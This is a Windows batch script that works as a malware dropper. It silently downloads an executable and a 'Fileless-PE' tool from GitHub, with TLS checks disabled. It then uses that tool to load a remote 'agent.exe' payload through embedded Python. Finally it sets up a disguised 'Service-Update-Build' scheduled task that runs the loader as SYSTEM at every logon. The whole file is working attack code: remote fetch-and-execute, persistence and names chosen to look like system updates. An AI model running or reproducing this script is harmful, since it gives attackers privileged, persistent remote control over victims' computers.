@echo off
set "AppDataPath=%AppData%"
setlocal enabledelayedexpansion
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
set /a MAJOR=%RANDOM% %% 10 + 1  :: 1-10
set /a MINOR=%RANDOM% %% 100    :: 0-99
set /a BUILD=%RANDOM% %% 1000   :: 0-999
set /a REVISION=%RANDOM% %% 10000 :: 0-9999
set "randomString="
for /l %%i in (1,1,10) do (
    set /a "rand=!random! %% 62"
    for /f %%j in ('echo !rand!') do set "randomString=!randomString!!chars:~%%j,1!"
)
set VERSION=%MAJOR%.%MINOR%.%BUILD%.%REVISION%
set "FolderName=%randomString%"
IF EXIST "C:\Program Files\Microsoft Deployment Toolkit\Templates\Distribution\Tools\x64\ServiceUI.exe" (
    set "serviceUIpath='C:\Program Files\Microsoft Deployment Toolkit\Templates\Distribution\Tools\x64\ServiceUI.exe'"
) ELSE (
    C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\ServiceUI.exe https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/ServiceUI.exe
    set "serviceUIpath=%AppDataPath%\ServiceUI.exe"
)
C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\main.zip https://github.com/malwarekid/Fileless-PE/archive/refs/heads/main.zip
C:\Windows\System32\tar.exe -xf -C %AppDataPath%\%FolderName% %AppDataPath%\main.zip
C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\python-3.14.0-embed-amd64.zip https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip
C:\Windows\System32\tar.exe -xf -C %AppDataPath%\%FolderName%\Fileless-PE-main %AppDataPath%\python-3.14.0-embed-amd64.zip
(echo https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/agent.exe && echo exe && echo %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py) | %AppDataPath%\%FolderName%\Fileless-PE-main\python.exe %AppDataPath%\%FolderName%\Fileless-PE-main\Fileless-PE.py
schtasks /create /tn Service-Update-Build-%VERSION% /tr "%serviceUIpath% %AppDataPath%\%FolderName%\Fileless-PE-main\pythonw.exe %AppDataPath%\%FolderName%\Fileless-PE-main\wssrvc.py" /sc onlogon /ru System
schtasks /run /tn Service-Update-Build-%VERSION%
